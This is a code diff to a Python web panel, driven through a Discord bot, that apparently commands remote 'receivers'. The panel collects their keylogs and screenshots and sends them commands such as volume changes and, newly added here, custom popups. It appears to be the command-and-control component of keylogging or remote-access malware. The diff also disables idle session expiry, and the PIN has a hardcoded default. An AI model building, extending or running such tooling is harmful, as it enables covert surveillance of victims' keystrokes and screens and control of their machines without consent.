@@ -45,9 +45,12 @@ LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "1457385049845403648"))
 BOT_TAG = ""
 PANEL_PIN = os.getenv("PANEL_PIN", "S4mb")
 try:
-    PIN_SESSION_TTL = max(60, int(os.getenv("PIN_SESSION_TTL", "300")))
+    # 0 disables idle expiry; session ends when the browser session ends.
+    PIN_SESSION_TTL = int(os.getenv("PIN_SESSION_TTL", "0"))
 except Exception:
-    PIN_SESSION_TTL = 300
+    PIN_SESSION_TTL = 0
+if PIN_SESSION_TTL < 0:
+    PIN_SESSION_TTL = 0
 PIN_COOKIE_NAME = "panel_session"
 
 assert CONTROLLER_TOKEN
@@ -114,10 +117,13 @@ def _save_screenshot_log():
         pass
 
 def _prune_pin_sessions(now: Optional[float] = None):
+    if PIN_SESSION_TTL <= 0:
+        return
     if now is None:
         now = time.time()
     for token, info in list(_pin_sessions.items()):
-        if info.get("expires", 0) <= now:
+        expires = info.get("expires")
+        if expires and expires <= now:
             _pin_sessions.pop(token, None)
 
 def _append_pin_log(entry: dict):
@@ -144,16 +150,21 @@ def _get_session_token(cookies: dict) -> Optional[str]:
 def _validate_pin_session(token: Optional[str], refresh: bool = False) -> bool:
     if not token:
         return False
-    _prune_pin_sessions()
+    if PIN_SESSION_TTL > 0:
+        _prune_pin_sessions()
     info = _pin_sessions.get(token)
     if not info:
         return False
     now = time.time()
-    if info.get("expires", 0) <= now:
-        _pin_sessions.pop(token, None)
-        return False
-    if refresh:
-        info["expires"] = now + PIN_SESSION_TTL
+    if PIN_SESSION_TTL > 0:
+        expires = info.get("expires")
+        if expires and expires <= now:
+            _pin_sessions.pop(token, None)
+            return False
+        if refresh:
+            info["expires"] = now + PIN_SESSION_TTL
+            info["last_seen"] = now
+    elif refresh:
         info["last_seen"] = now
     return True
 
@@ -168,13 +179,14 @@ def _session_ok_from_cookies(cookies: dict, refresh: bool = False) -> bool:
 def _create_pin_session(request: Request, client_id: str) -> str:
     now = time.time()
     token = secrets.token_urlsafe(24)
+    expires = now + PIN_SESSION_TTL if PIN_SESSION_TTL > 0 else None
     info = {
         "client_id": client_id or "",
         "ip": _get_client_ip(request),
         "ua": request.headers.get("user-agent", ""),
         "created": now,
         "last_seen": now,
-        "expires": now + PIN_SESSION_TTL,
+        "expires": expires,
     }
     _pin_sessions[token] = info
     _append_pin_log({
@@ -318,7 +330,6 @@ async def on_message(message: discord.Message):
                 _latest_screenshot["url"] = entry["url"]
                 _latest_screenshot["message_id"] = entry["message_id"]
                 _latest_screenshot["ts"] = entry["ts"]
-    # Track latest key logs posted by receiver
     if message.channel.id == LOG_CHANNEL_ID and message.content:
         text = (message.content or "").strip()
         if text.startswith("```") and text.endswith("```"):
@@ -332,13 +343,11 @@ async def on_message(message: discord.Message):
         _latest_keylog["text"] = text
         _latest_keylog["message_id"] = str(message.id)
         _latest_keylog["ts"] = str(message.created_at)
-    # Track receiver announcements
     if message.channel.id == COMMAND_CHANNEL_ID:
         content = (message.content or "").strip()
         if not content:
             return
         tokens = content.split()
-        # Drop optional BOT_TAG for backward compatibility
         if BOT_TAG and tokens and tokens[0] == BOT_TAG:
             tokens = tokens[1:]
         if tokens and tokens[0] in ("ONLINE", "PING") and len(tokens) >= 3:
@@ -479,7 +488,7 @@ CONTROL_HTML = """<!doctype html>
     p { margin: 0 0 12px; }
     label { display: block; margin-bottom: 6px; color: var(--muted); font-size: 13px; }
     input, button, select, textarea { font-family: inherit; }
-    input[type=file], input[type=text], input[type=number], select {
+    input[type=file], input[type=text], input[type=number], select, textarea {
       width: 100%;
       margin-bottom: 10px;
       padding: 11px 12px;
@@ -494,6 +503,7 @@ CONTROL_HTML = """<!doctype html>
       border-color: rgba(201,160,115,0.7);
       box-shadow: 0 0 0 2px rgba(201,160,115,0.15);
     }
+    textarea { min-height: 96px; resize: vertical; }
     button {
       cursor: pointer;
       background: linear-gradient(135deg, var(--accent), var(--accent-2));
@@ -592,6 +602,7 @@ CONTROL_HTML = """<!doctype html>
         <button class="tab-btn" data-tab="screen">Screen</button>
         <button class="tab-btn" data-tab="logs">Logs</button>
         <button class="tab-btn" data-tab="messages">Messages</button>
+        <button class="tab-btn" data-tab="popup">Popup</button>
         <button class="tab-btn" data-tab="remotes">remote's</button>
       </div>
       <div class="tab-pane active" data-tab="surprise">
@@ -698,6 +709,17 @@ CONTROL_HTML = """<!doctype html>
         </div>
         <pre id="message-output" class="mono-block">Waiting for messages...</pre>
       </div>
+      <div class="tab-pane" data-tab="popup">
+        <h1>Custom Popup</h1>
+        <p style="color:var(--muted); margin-bottom:12px;">
+          Send a custom message popup to the selected receiver.
+        </p>
+        <form method="post" action="/ui/popup">
+          <label for="popup-message">Popup message</label>
+          <textarea id="popup-message" name="message" placeholder="Type your message..." required></textarea>
+          <button type="submit">Send</button>
+        </form>
+      </div>
       <div class="tab-pane" data-tab="remotes">
         <h1>Remote's</h1>
         <p style="color:var(--muted); margin-bottom:12px;">
@@ -728,17 +750,20 @@ CONTROL_HTML = """<!doctype html>
     const pinInput = document.getElementById('pin-input');
     const pinError = document.getElementById('pin-error');
     const PIN_CLIENT_KEY = 'panel_client_id';
+    const PIN_SESSION_KEY = 'panel_session_ok';
     let sessionActive = false;
     function lockUI(message) {
       sessionActive = false;
       document.body.classList.add('locked');
       if (pinOverlay) pinOverlay.style.display = 'flex';
       if (pinError) pinError.textContent = message || '';
+      try { sessionStorage.removeItem(PIN_SESSION_KEY); } catch (e) { /* ignore */ }
     }
     function unlockUI() {
       sessionActive = true;
       document.body.classList.remove('locked');
       if (pinOverlay) pinOverlay.style.display = 'none';
+      try { sessionStorage.setItem(PIN_SESSION_KEY, '1'); } catch (e) { /* ignore */ }
     }
     function getClientId() {
       try {
@@ -758,6 +783,10 @@ CONTROL_HTML = """<!doctype html>
     }
     async function checkSession() {
       try {
+        if (!sessionStorage.getItem(PIN_SESSION_KEY)) {
+          lockUI('');
+          return false;
+        }
         const res = await fetch('/api/session');
         if (res.ok) {
           const data = await res.json();
@@ -1375,7 +1404,6 @@ async def api_pin(request: Request):
     resp.set_cookie(
         PIN_COOKIE_NAME,
         token,
-        max_age=PIN_SESSION_TTL,
         httponly=True,
         samesite="strict",
     )
@@ -1501,6 +1529,17 @@ async def ui_volume(request: Request):
     level = await _read_form_value(request, "level")
     if level:
         msg = _cmd_with_selection("SET_VOLUME", level)
+        print("Sending:", msg)
+        if not await _wait_controller_ready():
+            return HTMLResponse("Discord bot not ready", status_code=503)
+        await _send_cmd(msg)
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/popup")
+async def ui_popup(request: Request):
+    message = await _read_form_value(request, "message")
+    if message:
+        msg = _cmd_with_selection("CUSTOM_POPUP", message)
         print("Sending:", msg)
         if not await _wait_controller_ready():
             return HTMLResponse("Discord bot not ready", status_code=503)
